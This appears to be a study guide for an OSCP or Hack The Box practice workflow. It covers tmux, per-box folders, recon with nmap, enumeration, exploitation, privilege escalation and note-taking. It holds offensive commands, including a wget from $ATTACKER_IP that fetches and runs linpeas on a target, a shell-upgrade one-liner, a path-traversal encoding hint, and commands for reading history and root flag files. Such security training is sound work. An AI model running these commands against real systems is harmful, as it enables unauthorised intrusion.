enumerate → identify vector → exploit → repeat at next privilege level.

## Workspace setup (do this once)

**Inside Kali — use tmux from day one.** This is the single biggest workflow upgrade. One terminal window, multiple panes/sessions:

```
tmux new -s box-name
# Ctrl+b " → horizontal split
# Ctrl+b % → vertical split
# Ctrl+b arrow → move between panes
# Ctrl+b d → detach (box keeps running)
# tmux attach -t box-name → re-attach
```


## Per-box folder structure

Before starting any box, in Kali:

```bash
# 1. Set the variables
export BOXNAME=lame
export IP=10.10.10.3

# 2. Make the folder structure and move into it
mkdir -p ~/oscp/$BOXNAME/{nmap,www,loot,exploits,screenshots}
cd ~/oscp/$BOXNAME

# 3. Confirm you're in the right place
pwd
# should print: /home/kali/oscp/lame

# 4. Start your first scan
nmap -p- --min-rate 5000 -oN nmap/allports.txt $IP
```

Everything for this box lives here. When you find creds, 
`echo "user:pass" >> loot/creds.txt`. 
When you download an exploit, it goes in `exploits/`. 
Screenshots dropped in `screenshots/`. 

Set up a shared folder in VMware so `~/oscp/` on Kali maps to a folder on Windows. Now screenshots and command outputs are accessible to Obsidian without copy-paste.

## The actual loop

### Phase 1: Recon (10-20 min)

**Goal:** know every port, every service, every version.

```bash
# pane 1
nmap -p- --min-rate 5000 -oN nmap/allports.txt $IP

# while that runs, do quick passive recon in browser:
# - is the IP a known box? (skip if exam)
# - any DNS hint from hostname?

# when allports done, copy port list, then:
nmap -sC -sV -p<ports> -oN nmap/scripts.txt $IP

# UDP in background
sudo nmap -sU --top-ports 50 -oN nmap/udp.txt $IP &
```

**Note-taking during this phase:** create the box note in Obsidian from your template. Fill the header (IP, date started). Paste nmap output into Recon section. _That's it._ Don't write prose yet.

### Phase 2: Service enumeration (30-60 min)

**Goal:** for every open port, run the standard enumeration for that service and write findings.

Your `Cheatsheets/Enumeration-Commands.md` is the source of truth here. For each port:

- Web → directory brute + whatweb + view source + check robots.txt
- SMB → null session + smbmap + enum4linux-ng
- FTP → anonymous + version check
- SSH → version + algorithms
- etc.

In tmux: launch dir brute and other long-running enum in their own panes so they run while you manually explore.

**Note-taking:** in Obsidian Enumeration section, write _findings only_, not commands run. Findings = "Apache 2.4.49 on port 80", "anonymous FTP allowed, files: backup.zip", "SMB share 'dev' readable by null session". One line per finding. If commands matter, link to a file in the box's Kali folder (since you have shared folder set up).

### Phase 3: Identify attack surface (15-30 min)

**Goal:** stop enumerating, start thinking. Look at your findings list and pick the most promising vector.

This is where you switch to Google/searchsploit:

```bash
searchsploit apache 2.4.49
# → CVE-2021-41773 path traversal
```

**Decision rule:** investigate the lowest-hanging fruit first.

- Known CVE for the exact version → try that
- Default creds on a service → try those
- Writeable share with executable upload → try that
- Custom web app → test for OWASP top 10

If you find 3 promising vectors, list them in your Obsidian note and try them in order of "least effort first."

**Important: set a budget per vector.** "I'll try this CVE for 30 minutes. If it doesn't work, next vector." Without budgets you waste 4 hours on a dead end.

### Phase 4: Exploit (variable)

**Goal:** get a shell, any shell.

This is where the workflow tends to break for beginners because exploitation involves errors and adjustments. Discipline:

1. **Set up listener BEFORE running the exploit.** In tmux pane 2.
2. **Run the exploit.** Watch the listener pane for callback.
3. **If it fails, change ONE thing.** Not three. Read the error message.
4. **Screenshot when it works** — terminal showing the exploit + shell received.

When you have a shell:

```bash
# upgrade it immediately
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl+Z, stty raw -echo; fg, export TERM=xterm
```

**Note-taking:** in Foothold section of Obsidian, write the _single exact command_ that worked and the _single key insight_ (e.g., "the path traversal required `%2e%2e%2f` not `../`"). Skip the 12 failed attempts. You only need to remember what works.

### Phase 5: Post-exploitation enumeration (15-30 min)

**Goal:** know the system you're on before trying to escalate.

```bash
# get linpeas onto target
# attacker:
python3 -m http.server 80
# target:
wget http://$ATTACKER_IP/linpeas.sh -O /tmp/lp.sh
chmod +x /tmp/lp.sh && /tmp/lp.sh -a | tee /tmp/lp.out
```

While linpeas runs (it's slow), you do manual quick checks in parallel:

```bash
whoami; id; sudo -l
ls -la ~/; cat ~/.bash_history
ps aux | grep root
ss -tulpn
```

**Note-taking:** in Privilege Escalation section, note the findings, not the commands. "User is in 'docker' group", "tar binary has SUID set", "cron job running /opt/backup.sh as root, file is writable".

### Phase 6: Privesc (variable)

Same logic as Phase 4. Identify vector, set budget, try, iterate. When root:

```bash
# screenshot the win
whoami; hostname; cat /root/root.txt
```

### Phase 7: Documentation (15-20 min, mandatory)

**Don't skip this.** This is what makes the next box faster.

In Obsidian:

1. Fill Summary (one sentence: "Foothold via Apache path traversal CVE-2021-41773, privesc via writable cron job")
2. Confirm screenshots are saved + referenced
3. **Lessons section:** what didn't you know? What surprised you? 3-5 bullet points.
4. **Techniques links:** if you used something reusable (e.g., a specific privesc method), open the corresponding `Techniques/` note and add a line referencing this box. If the technique is new, create the technique note.
5. Update tags: `#rooted` (or `#assisted` if you used a writeup)

## Browser discipline

The browser is where workflow breaks. Three rules:

1. **One browser window per box.** Close everything else. The temptation to "just check Discord" while a scan runs kills focus.
    
2. **Tab layout:**
    
    - Tab 1: target web app (if any)
    - Tab 2: writeup (only after stuck or rooted — see below)
    - Tab 3: research (Google, exploit-db, GTFOBins, HackTricks)
    - Tab 4: HTB/PG box page (to submit flag)
    - Close everything else
3. **Writeup discipline:** No writeups until you're stuck for 2+ hours OR you've rooted the box. When stuck, open the writeup and read _only enough to unstick yourself._ Close it. Continue. After rooting, read full writeup to find what you missed. Tag the box `#assisted` if you used hints.
    

## When to research vs when to try

Beginners alt-tab to Google every 30 seconds. This destroys focus. Heuristic:

- **You know what to try → try it first, Google only if it fails.**
- **You don't know what to try → Google before trying.**
- **You're 3 attempts deep on the same approach → stop, Google for a different approach.**

If you find yourself with 20 browser tabs open about the same topic, you've gone too deep. Close them, write down what you actually learned in 2 sentences in Obsidian, and go back to the terminal.

## Anti-patterns to watch for in yourself

These are the patterns I'd bet you're doing right now:

- **Running a command, watching it finish, then deciding what to do next.** Fix: always have the next command queued mentally or in a tmux pane before the current one finishes.
- **Taking notes "later."** Fix: notes happen _during_ each phase, not after. Write the finding while it's on screen.
- **Re-running enumeration because you didn't save output.** Fix: every command writes to a file (`-oN`, `| tee`, `>`). Never lose output.
- **Reading writeups too early.** Fix: 2-hour minimum before any hint.
- **Switching to a different box when stuck.** Fix: don't, for the first month. Push through one box before moving on. Switching is a habit that costs you depth.

## A concrete first session using this workflow

Tomorrow night, 8pm:

1. Set timer for 2 hours
2. Pick an HTB Academy lab target from the module you're on (or wait for PEN-200 and pick a PWK box)
3. Open tmux, make the box folder, set $IP
4. Phase 1: nmap
5. Phase 2: enumerate each port, taking findings notes
6. Phase 3: identify vector
7. Phase 4: try to exploit (if you fail this phase, fine — note where you got stuck)
8. Whether you root or not, do Phase 7 (documentation) before stopping

After session, look back: how much of the chaos went away? What stage took longest? That's your data for the next session.

The workflow gets faster every box. By box 10, the recon/enumeration phases feel automatic and you spend brain on exploitation. That's the goal.